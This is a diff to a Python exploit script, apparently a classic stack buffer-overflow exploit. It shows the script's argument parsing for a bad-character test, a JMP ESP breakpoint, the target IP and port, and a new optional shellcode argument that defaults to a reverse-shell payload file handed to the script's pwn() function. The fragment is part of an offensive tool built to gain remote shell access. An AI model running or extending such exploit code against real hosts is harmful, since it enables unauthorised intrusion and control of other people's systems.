@@ -37,7 +37,7 @@ def main(args):
     elif args.breakpoint:
         pwn(args.ip, args.port, 'break')
     else:
-        pwn(args.ip, args.port, 'attack')
+        pwn(args.ip, args.port, args.payload)
 
     _logger.debug("All done, shutting down.")
     logging.shutdown()
@@ -71,7 +71,7 @@ def parse_args(args):
         '--chars',
         help="Send buffer with set of chars to test for bad chars",
         action="store_true"),
-     parser.add_argument(
+    parser.add_argument(
         '-b',
         '--breakpoint',
         help="Send buffer with address to JMP ESP and a breakpoint on return",
@@ -83,7 +83,14 @@ def parse_args(args):
     parser.add_argument(
         'port',
         type=int,
-        help="Port to connect to")
+        help="Port to connect to"),
+    parser.add_argument(
+        'payload',
+        nargs='?',
+        type=str,
+        default='payloads/reverse_shell.dat',
+        help="Shellcode to be sent as the payload")
+
     return parser.parse_args(args)
 
 
